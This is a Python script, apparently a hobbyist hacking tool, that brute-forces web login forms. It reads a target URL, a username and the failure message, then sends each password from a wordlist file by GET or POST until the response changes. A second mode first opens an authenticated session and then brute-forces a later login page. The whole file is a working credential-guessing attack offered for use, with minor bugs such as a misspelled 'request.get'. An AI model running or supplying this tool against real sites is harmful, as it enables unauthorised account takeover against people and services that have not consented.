import requests
import cattern
cattern.cattrn('tryBrute')

def menu(i):
    switch = {
        1 : "1. You didn't need session" ,
        2 : "2. You need a session"
    }
    return switch.get(i, 'invalid input')

def first(): 
    url = input("Enter Target Url: ")
    username = input("Enter Target Username: ")
    error = input("Enter Wrong Password Error Message: ")
    request_type = input("get or post: ")   
    try: 
        def tryBrute(username,url,error,request_type):
            count = 0
            for password in passwords:
                password = password.strip()
                count += 1
                print("Trying: "+ str(count) + ' Time For => ' + password)
                payload = {"username": username,"password":password, "Login":"submit"}
                if request_type == 'post':
                    response = requests.post(url, data=payload)
                elif request_type =='get':
                    response = request.get(url, params=payload)
                if error in str(response.content):
                    pass
                else:
                    print("Username: ---> " + username)
                    print("Password: ---> " + password)
                    exit()
    except:
        print("Some Error Occurred Please Check Your Internet Connection !!")
    with open("pass.txt", "r") as passwords:
        tryBrute(username,url,error,request_type)

def second():
    url = input("Url to get session: ")
    username = input("Username to get session: ")    
    Passwd = input("Password to get session: ")
    new_url = input("Url for final login page: ")
    error = input("Enter Wrong Password Error Message: ")
    request_type = input("get or post: ")
    correct_data = {"username":username, "password":Passwd,"Login":"submit"}
    try:
        def tryBrute(username,url,error,request_type,correct_data,new_url):
                count = 0
                for password in passwords:
                    password = password.strip()
                    count += 1
                    print("Trying: "+ str(count) + ' Time For => ' + password)
                    data_dict = {"username": username,"password":password, "Login":"submit"}
                    session = requests.Session()
                    r = session.post(url, data=correct_data)
                    if request_type =='get':
                        s = session.get(new_url, params= data_dict)
                    elif request_type =='post':
                        s = session.post(new_url, data= data_dict)
                    if error in str(s.content):
                        pass
                    else:
                        print("Username: ---> " + username)
                        print("Password: ---> " + password)
                        exit()
    except:
        print("Some Error Occurred Please Check Your Internet Connection !!")  
    with open("pass.txt", "r") as passwords:
        tryBrute(username,url,error,request_type,correct_data,new_url)

print(menu(1))
print(menu(2))
choice = input("select: ")
if choice == '1':
    first()
if choice == '2':
    second()

